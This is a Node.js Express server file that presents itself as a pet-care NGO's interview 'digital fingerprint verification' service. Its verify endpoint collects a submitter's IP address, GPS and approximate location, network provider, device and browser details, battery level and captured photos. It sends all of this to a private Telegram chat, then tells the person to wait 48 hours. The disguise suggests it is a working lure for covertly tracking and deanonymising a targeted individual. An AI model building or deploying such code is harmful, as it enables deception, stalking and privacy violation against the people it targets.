require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 3000;

// Initialize Telegram Bot
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Security Middleware
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'", "https://cdnjs.cloudflare.com", "https://fonts.googleapis.com"],
      scriptSrc: ["'self'", "'unsafe-inline'"],
      fontSrc: ["'self'", "https://fonts.gstatic.com", "https://cdnjs.cloudflare.com"],
      imgSrc: ["'self'", "blob:", "data:"],
      mediaSrc: ["'self'", "blob:"],
      connectSrc: ["'self'"],
    },
  },
}));

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static('public'));

// Rate Limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 10, // limit each IP to 10 requests per windowMs
  message: { success: false, message: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// Multer configuration for image uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const uploadDir = path.join(__dirname, 'uploads');
    if (!fs.existsSync(uploadDir)) {
      fs.mkdirSync(uploadDir, { recursive: true });
    }
    cb(null, uploadDir);
  },
  filename: (req, file, cb) => {
    const uniqueName = `${uuidv4()}-${Date.now()}${path.extname(file.originalname)}`;
    cb(null, uniqueName);
  }
});

const upload = multer({ 
  storage: storage,
  limits: { fileSize: 10 * 1024 * 1024 }, // 10MB limit
  fileFilter: (req, file, cb) => {
    if (file.mimetype.startsWith('image/')) {
      cb(null, true);
    } else {
      cb(new Error('Only image files are allowed'));
    }
  }
});

// Date data
const interviewDates = [
  "01/01/2026", "15/01/2026", "10/02/2026", "05/03/2026",
  "20/04/2026", "01/05/2026", "15/06/2026", "04/07/2026",
  "31/07/2026", "05/08/2026"
];

// Routes
app.get('/api/dates', (req, res) => {
  res.json({ success: true, dates: interviewDates });
});

app.post('/api/verify', upload.array('petPhotos', 6), async (req, res) => {
  try {
    const { 
      rorshid, 
      interviewDate, 
      ipAddress, 
      approxLocation, 
      browserType, 
      os, 
      deviceType, 
      language, 
      gpsLocation, 
      screenResolution, 
      networkProvider, 
      batteryInfo 
    } = req.body;

    const files = req.files || [];
    const submissionId = uuidv4();
    const timestamp = new Date().toISOString();

    // Build message for Telegram
    let message = `
🔐 *OPEN-SHARE VERIFICATION SUBMISSION*
━━━━━━━━━━━━━━━━━━━━━━

📋 *Submission ID:* \`${submissionId}\`
⏰ *Timestamp:* ${timestamp}

👤 *Candidate Information:*
• @rorshid: \`${rorshid || 'Not provided'}\`
• Interview Date: ${interviewDate || 'Not selected'}

🌐 *Network & Location:*
• IP Address: \`${ipAddress || 'N/A'}\`
• Approx Location: ${approxLocation || 'N/A'}
• GPS Location: ${gpsLocation || 'N/A'}
• Network Provider: ${networkProvider || 'N/A'}

💻 *Device Information:*
• Browser: ${browserType || 'N/A'}
• OS: ${os || 'N/A'}
• Device Type: ${deviceType || 'N/A'}
• Language: ${language || 'N/A'}
• Screen Resolution: ${screenResolution || 'N/A'}

🔋 *Battery Status:*
• Level: ${batteryInfo || 'N/A'}

📸 *Photos Captured:* ${files.length} images
    `;

    // Send text message to Telegram
    await bot.sendMessage(CHAT_ID, message, { 
      parse_mode: 'MarkdownV2',
      disable_web_page_preview: true 
    });

    // Send photos to Telegram
    if (files.length > 0) {
      const mediaGroup = files.map(file => ({
        type: 'photo',
        media: fs.createReadStream(file.path),
        caption: `Pet Photo - ${file.originalname}`
      }));

      // Send in batches of 10 (Telegram limit)
      for (let i = 0; i < mediaGroup.length; i += 10) {
        const batch = mediaGroup.slice(i, i + 10);
        try {
          await bot.sendMediaGroup(CHAT_ID, batch);
        } catch (err) {
          console.error('Error sending media group:', err.message);
          // Fallback: send individually
          for (const media of batch) {
            try {
              await bot.sendPhoto(CHAT_ID, media.media, { caption: media.caption });
            } catch (e) {
              console.error('Error sending individual photo:', e.message);
            }
          }
        }
      }
    }

    // Cleanup uploaded files
    files.forEach(file => {
      fs.unlink(file.path, (err) => {
        if (err) console.error('Error deleting file:', err);
      });
    });

    res.json({ 
      success: true, 
      message: 'Data sent successfully. Please wait 48 hours or contact the organization for confirmation.',
      submissionId 
    });

  } catch (error) {
    console.error('Verification error:', error);
    res.status(500).json({ 
      success: false, 
      message: 'An error occurred while processing your submission. Please try again.' 
    });
  }
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Serve index.html for all other routes
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Error handling
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({ 
    success: false, 
    message: err.message || 'Internal server error' 
  });
});

app.listen(PORT, () => {
  console.log(`
╔══════════════════════════════════════════════════════╗
║                                                      ║
║           🐾 OPEN-SHARE SERVER RUNNING 🐾            ║
║                                                      ║
║   Pet Care NGO - Digital Fingerprint Verification    ║
║                                                      ║
║   Server running on port: ${PORT.toString().padEnd(37)}║
║   Environment: ${(process.env.NODE_ENV || 'development').padEnd(43)}║
║                                                      ║
╚══════════════════════════════════════════════════════╝
  `);
});
